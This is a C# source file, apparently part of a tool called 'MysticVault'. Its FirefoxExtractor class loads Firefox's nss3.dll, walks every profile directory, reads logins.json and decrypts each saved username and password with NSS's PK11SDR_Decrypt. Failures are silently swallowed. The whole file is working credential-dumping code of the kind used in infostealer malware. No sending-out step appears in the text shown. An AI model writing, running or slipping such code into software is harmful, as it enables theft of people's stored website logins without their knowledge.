using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.Json;

namespace MysticVault;

public static class FirefoxExtractor
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool SetDllDirectory(string? lpPathName);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool FreeLibrary(IntPtr hModule);

    private static readonly (string Name, string InstallDir, string ProfilesDir)[] Variants =
    {
        ("Firefox", @"C:\Program Files\Mozilla Firefox", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Mozilla\Firefox\Profiles")),
        ("Firefox ESR", @"C:\Program Files\Firefox ESR", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Mozilla\Firefox ESR\Profiles")),
    };

    public static List<ExtractedCredential> ExtractAll()
    {
        var results = new List<ExtractedCredential>();
        foreach (var variant in Variants)
        {
            if (!Directory.Exists(variant.InstallDir) || !Directory.Exists(variant.ProfilesDir)) continue;
            try { results.AddRange(ExtractFromProfiles(variant.InstallDir, variant.ProfilesDir)); }
            catch { }
        }
        return results;
    }

    private static List<ExtractedCredential> ExtractFromProfiles(string installDir, string profilesDir)
    {
        var results = new List<ExtractedCredential>();
        SetDllDirectory(installDir);
        IntPtr mozglue = LoadLibrary("mozglue.dll");
        IntPtr nss3 = LoadLibrary("nss3.dll");
        if (nss3 == IntPtr.Zero)
        {
            SetDllDirectory(null);
            return results;
        }

        try
        {
            var initPtr = GetProcAddress(nss3, "NSS_Init");
            var shutdownPtr = GetProcAddress(nss3, "NSS_Shutdown");
            var decryptPtr = GetProcAddress(nss3, "PK11SDR_Decrypt");
            var freePtr = GetProcAddress(nss3, "SECITEM_ZfreeItem");
            if (initPtr == IntPtr.Zero || decryptPtr == IntPtr.Zero) return results;

            var nssInit = Marshal.GetDelegateForFunctionPointer<NssHelper.NSS_Init>(initPtr);
            var nssShutdown = Marshal.GetDelegateForFunctionPointer<NssHelper.NSS_Shutdown>(shutdownPtr);
            var pk11SdrDecrypt = Marshal.GetDelegateForFunctionPointer<NssHelper.PK11SDR_Decrypt>(decryptPtr);
            var secItemFree = Marshal.GetDelegateForFunctionPointer<NssHelper.SECITEM_ZfreeItem>(freePtr);

            foreach (var profileDir in Directory.GetDirectories(profilesDir))
            {
                string loginsPath = Path.Combine(profileDir, "logins.json");
                string key4Path = Path.Combine(profileDir, "key4.db");
                if (!File.Exists(loginsPath) || !File.Exists(key4Path)) continue;

                if (nssInit(profileDir) != 0) continue;

                try
                {
                    string json = File.ReadAllText(loginsPath);
                    using (JsonDocument doc = JsonDocument.Parse(json))
                    {
                        if (doc.RootElement.TryGetProperty("logins", out JsonElement loginsArray))
                        {
                            foreach (JsonElement login in loginsArray.EnumerateArray())
                            {
                                string hostname = login.GetProperty("hostname").GetString() ?? "";
                                string encUser = login.GetProperty("encryptedUsername").GetString() ?? "";
                                string encPass = login.GetProperty("encryptedPassword").GetString() ?? "";
                                string username = NssHelper.Decrypt(encUser, pk11SdrDecrypt, secItemFree);
                                string password = NssHelper.Decrypt(encPass, pk11SdrDecrypt, secItemFree);
                                if (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(password))
                                    results.Add(new ExtractedCredential(hostname, username, password));
                            }
                        }
                    }
                }
                finally
                {
                    nssShutdown();
                }
            }
        }
        finally
        {
            if (nss3 != IntPtr.Zero) FreeLibrary(nss3);
            if (mozglue != IntPtr.Zero) FreeLibrary(mozglue);
            SetDllDirectory(null);
        }

        return results;
    }
}
